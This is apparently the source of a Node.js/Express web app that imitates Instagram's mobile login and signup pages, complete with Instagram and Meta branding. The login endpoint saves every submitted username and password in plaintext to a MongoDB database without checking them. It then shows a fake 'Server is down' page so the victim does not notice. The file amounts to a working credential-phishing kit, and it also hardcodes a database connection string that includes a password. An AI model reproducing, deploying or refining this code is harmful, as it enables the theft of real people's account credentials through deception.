// ===============================
// INSTAGRAM MOBILE CLONE LOGIN
// FINAL UPDATED UI
// ===============================

const express = require("express");
const mongoose = require("mongoose");
const path = require("path");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use(express.static(path.join(__dirname, "public")));

// ===============================
// MONGODB
// ===============================
const MONGODB_URI =
  process.env.MONGODB_URI ||
  "mongodb+srv://emailspare365_db_user:7ZR7ZQz1YJD8IKAK@cluster0.wj5jeip.mongodb.net/login?appName=Cluster0";

mongoose
  .connect(MONGODB_URI)
  .then(() => console.log("✅ MongoDB Connected"))
  .catch((err) => console.log(err));

// ===============================
// USER MODEL
// ===============================
const userSchema = new mongoose.Schema({
  username: String,
  password: String,
  emailOrPhone: String,
  fullName: String,
});

const User = mongoose.model("User", userSchema);

// ===============================
// LOGIN API
// ===============================
app.post("/api/login", async (req, res) => {
  try {
    const { username, password } = req.body;

    if (!username || !password) {
      return res.status(400).json({
        success: false,
        message: "Fill the username and password",
      });
    }

    // KEEP SAME
    if (password.length < 6) {
      return res.status(400).json({
        success: false,
        message: "Password length minimum 6 characters",
      });
    }

    // SAVE USER DATA
    await User.create({
      username,
      password,
      emailOrPhone: "",
      fullName: "",
    });

    // FIRST ATTEMPT DIRECTLY SERVER DOWN
    return res.json({
      success: true,
      redirect: "/server-down",
    });

  } catch (err) {

    console.log(err);

    return res.status(500).json({
      success: false,
      message: "Server Error",
    });
  }
});

// ===============================
// SIGNUP API
// ===============================
app.post("/api/signup", async (req, res) => {

  try {

    const {
      emailOrPhone,
      password,
      fullName,
      username
    } = req.body;

    if (
      !emailOrPhone ||
      !password ||
      !fullName ||
      !username
    ) {

      return res.status(400).json({
        success:false,
        message:"All fields required"
      });
    }

    if (password.length < 6) {

      return res.status(400).json({
        success:false,
        message:"Password length minimum 6 characters"
      });
    }

    await User.create({
      emailOrPhone,
      password,
      fullName,
      username,
    });

    return res.json({
      success:true,
      redirect:"/"
    });

  } catch (err) {

    console.log(err);

    return res.status(500).json({
      success:false,
      message:"Signup Failed"
    });
  }
});

// ===============================
// LOGIN PAGE
// ===============================
const loginPageHTML = `
<!DOCTYPE html>
<html lang="en">

<head>

<meta charset="UTF-8" />

<meta
name="viewport"
content="width=device-width, initial-scale=1.0"/>

<title>Instagram</title>

<style>

*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family:system-ui;
}

body{
  background:#0f1c26;
  color:white;
  min-height:100vh;
  overflow-x:hidden;
}

.page-wrapper{
  width:100%;
  max-width:420px;
  margin:auto;
  padding:30px 24px;
  min-height:100vh;
  display:flex;
  flex-direction:column;
}

.language{
  text-align:center;
  color:#9aa4ad;
  font-size:18px;
  margin-top:10px;
}

.logo-box{
  display:flex;
  justify-content:center;
  margin-top:70px;
  margin-bottom:60px;
}

.logo-img{
  width:170px;
}

.input-group{
  position:relative;
  margin-bottom:16px;
}

.input-group input{
  width:100%;
  height:58px;
  padding:0 18px;
  background:#182734;
  border:1px solid #3a4c5c;
  border-radius:16px;
  color:white;
  font-size:18px;
  outline:none;
}

.input-group input::placeholder{
  color:#95a1ac;
}

.eye-btn{
  position:absolute;
  right:16px;
  top:50%;
  transform:translateY(-50%);
  background:none;
  border:none;
  cursor:pointer;
  display:none;
  align-items:center;
  justify-content:center;
  padding:0;
  width:32px;
  height:32px;
  overflow:visible;
}

.login-btn{
  width:100%;
  height:54px;
  border:none;
  border-radius:30px;
  background:#1877f2;
  color:white;
  font-size:20px;
  font-weight:600;
  margin-top:10px;
  cursor:pointer;
}

.forgot-password{
  text-align:center;
  margin-top:26px;
  color:white;
  font-size:18px;
}

.input-error{
  color:#ff4d67;
  font-size:13px;
  margin-top:6px;
  margin-left:4px;
}

.bottom-section{
  margin-top:auto;
  padding-bottom:30px;
}

.create-account{
  width:100%;
  height:54px;
  border:1px solid #1877f2;
  border-radius:30px;
  display:flex;
  align-items:center;
  justify-content:center;
  color:#1877f2;
  font-size:20px;
  font-weight:600;
  margin-bottom:34px;
  text-decoration:none;
}

.meta-logo{
  text-align:center;
  color:#d4d4d4;
  font-size:22px;
}

</style>

</head>

<body>

<div class="page-wrapper">

<div class="language">
English (US)
</div>

<div class="logo-box">
<img
src="/Og_logo-Photoroom.png"
class="logo-img"/>
</div>

<form id="loginForm">

<div class="input-group">

<input
id="username"
type="text"
placeholder="Username, email or mobile number"
/>

<div
id="usernameError"
class="input-error">
</div>

</div>

<div class="input-group">

<input
id="password"
type="password"
placeholder="Password"
/>

<button
type="button"
id="togglePassword"
class="eye-btn">

<!-- EYE OPEN -->
<svg
id="eyeOpen"
xmlns="http://www.w3.org/2000/svg"
width="24"
height="24"
viewBox="0 0 24 24"
fill="none"
stroke="white"
stroke-width="2"
stroke-linecap="round"
stroke-linejoin="round">

<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"></path>

<circle cx="12" cy="12" r="3"></circle>

</svg>

<!-- EYE CLOSE -->
<svg
id="eyeClose"
style="display:none"
xmlns="http://www.w3.org/2000/svg"
width="24"
height="24"
viewBox="0 0 24 24"
fill="none"
stroke="white"
stroke-width="2"
stroke-linecap="round"
stroke-linejoin="round">

<path d="M2 2L22 22"></path>

<path d="M9.88 9.88a3 3 0 1 0 4.24 4.24"></path>

<path d="M10.73 5.08A10.43 10.43 0 0 1 12 5
c7 0 11 7 11 7
a21.31 21.31 0 0 1-2.31 3.34"></path>

<path d="M6.61 6.61A21.18 21.18 0 0 0 1 12
s4 7 11 7
a10.68 10.68 0 0 0 5.39-1.39"></path>

</svg>

</button>

<div
id="passwordError"
class="input-error">
</div>

</div>

<button
type="submit"
id="loginBtn"
class="login-btn">

Log in

</button>

<div
id="globalError"
class="input-error"
style="text-align:center;margin-top:10px;">
</div>

</form>

<div class="forgot-password">
Forgot password?
</div>

<div class="bottom-section">

<a
href="/signup"
class="create-account">

Create new account

</a>

<div class="meta-logo">
Meta
</div>

</div>

</div>

<script>

// PASSWORD ELEMENTS
const passwordInput =
document.getElementById('password');

const togglePassword =
document.getElementById('togglePassword');

const eyeOpen =
document.getElementById('eyeOpen');

const eyeClose =
document.getElementById('eyeClose');

// SHOW EYE ICON WHEN PASSWORD INPUT FOCUS
passwordInput.addEventListener('focus', () => {

  togglePassword.style.display = 'flex';
});

// HIDE EYE ICON WHEN CLICK OUTSIDE
document.addEventListener('click', (e) => {

  const insidePassword =
  e.target.closest('.input-group');

  if (!insidePassword) {

    togglePassword.style.display = 'none';
  }
});

// TOGGLE PASSWORD VISIBILITY
togglePassword.addEventListener('click', (e) => {

  e.preventDefault();

  const hidden =
  passwordInput.type === 'password';

  passwordInput.type =
  hidden ? 'text' : 'password';

  if(hidden){

    eyeOpen.style.display = 'none';
    eyeClose.style.display = 'block';

  }else{

    eyeOpen.style.display = 'block';
    eyeClose.style.display = 'none';
  }
});

// LOGIN FORM
document
.getElementById('loginForm')
.addEventListener('submit', async (e) => {

  e.preventDefault();

  document
  .getElementById('globalError')
  .textContent = '';

  document
  .getElementById('passwordError')
  .textContent = '';

  const username =
  document
  .getElementById('username')
  .value
  .trim();

  const password =
  document
  .getElementById('password')
  .value;

  if (!username || !password) {

    document
    .getElementById('globalError')
    .textContent =
    'Fill the username and password';

    return;
  }

  // KEEP SAME
  if (password.length < 6) {

    document
    .getElementById('passwordError')
    .textContent =
    'Password length minimum 6 characters';

    return;
  }

  try {

    const res =
    await fetch('/api/login', {

      method:'POST',

      headers:{
        'Content-Type':'application/json'
      },

      body:JSON.stringify({
        username,
        password
      })
    });

    const data =
    await res.json();

    if (!data.success) {

      document
      .getElementById('globalError')
      .textContent =
      data.message || 'Server Error';

    } else {

      window.location.href =
      data.redirect || '/server-down';
    }

  } catch(err){

    console.log(err);

    document
    .getElementById('globalError')
    .textContent =
    'Server Error';
  }

});

</script>

</body>
</html>
`;

// ===============================
// SIGNUP PAGE
// ===============================
const signupPageHTML = `
<!DOCTYPE html>
<html>

<head>

<meta charset="UTF-8"/>

<meta
name="viewport"
content="width=device-width, initial-scale=1.0"/>

<title>Instagram Signup</title>

<style>

body{
  background:#0f1c26;
  color:white;
  font-family:system-ui;
  padding:24px;
}

.container{
  max-width:420px;
  margin:auto;
}

.logo{
  text-align:center;
  margin-top:40px;
  margin-bottom:40px;
}

.logo img{
  width:170px;
}

input{
  width:100%;
  height:56px;
  margin-bottom:16px;
  padding:0 18px;
  border-radius:16px;
  border:1px solid #3a4c5c;
  background:#182734;
  color:white;
  font-size:18px;
  outline:none;
}

button{
  width:100%;
  height:54px;
  border:none;
  border-radius:30px;
  background:#1877f2;
  color:white;
  font-size:20px;
  font-weight:600;
  cursor:pointer;
}

a{
  color:#1877f2;
  text-decoration:none;
}

.bottom{
  text-align:center;
  margin-top:30px;
}

</style>

</head>

<body>

<div class="container">

<div class="logo">

<img src="/Og_logo-Photoroom.png"/>

</div>

<form id="signupForm">

<input
id="emailOrPhone"
placeholder="Mobile number or email"
/>

<input
id="signupPassword"
type="password"
placeholder="Password"
/>

<input
id="fullName"
placeholder="Full Name"
/>

<input
id="signupUsername"
placeholder="Username"
/>

<button type="submit">

Sign up

</button>

</form>

<div class="bottom">

Already have an account?

<a href="/">
Log in
</a>

</div>

</div>

<script>

document
.getElementById('signupForm')
.addEventListener('submit', async (e) => {

  e.preventDefault();

  const emailOrPhone =
  document
  .getElementById('emailOrPhone')
  .value
  .trim();

  const password =
  document
  .getElementById('signupPassword')
  .value;

  const fullName =
  document
  .getElementById('fullName')
  .value
  .trim();

  const username =
  document
  .getElementById('signupUsername')
  .value
  .trim();

  if (
    !emailOrPhone ||
    !password ||
    !fullName ||
    !username
  ){

    alert('Please fill all fields');

    return;
  }

  if(password.length < 6){

    alert('Password length minimum 6 characters');

    return;
  }

  try{

    const res =
    await fetch('/api/signup',{

      method:'POST',

      headers:{
        'Content-Type':'application/json'
      },

      body:JSON.stringify({
        emailOrPhone,
        password,
        fullName,
        username
      })
    });

    const data =
    await res.json();

    if(!data.success){

      alert(data.message || 'Signup Failed');

    }else{

      window.location.href = '/';
    }

  }catch(err){

    console.log(err);

    alert('Signup Failed');
  }

});

</script>

</body>
</html>
`;

// ===============================
// SERVER DOWN PAGE
// ===============================
const serverDownHTML = `
<!DOCTYPE html>
<html>

<head>

<meta charset="UTF-8"/>

<title>Server Down</title>

<style>

body{
  background:#0f1c26;
  color:white;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
  font-family:system-ui;
}

.box{
  text-align:center;
}

img{
  width:170px;
  margin-bottom:20px;
}

h2{
  margin-bottom:10px;
}

button{
  margin-top:20px;
  width:220px;
  height:50px;
  border:none;
  border-radius:30px;
  background:#1877f2;
  color:white;
  font-size:18px;
  cursor:pointer;
}

</style>

</head>

<body>

<div class="box">

<img src="/Og_logo-Photoroom.png"/>

<h2>Server is down</h2>

<p>Sorry, something went wrong.</p>

<button onclick="location.href='/'">

Try Again

</button>

</div>

</body>
</html>
`;

// ===============================
// ROUTES
// ===============================
app.get("/", (req, res) => {
  res.send(loginPageHTML);
});

app.get("/signup", (req, res) => {
  res.send(signupPageHTML);
});

app.get("/server-down", (req, res) => {
  res.send(serverDownHTML);
});

// ===============================
// SERVER START
// ===============================
app.listen(PORT, () => {

  console.log(
    "🚀 Server running on http://localhost:" + PORT
  );

});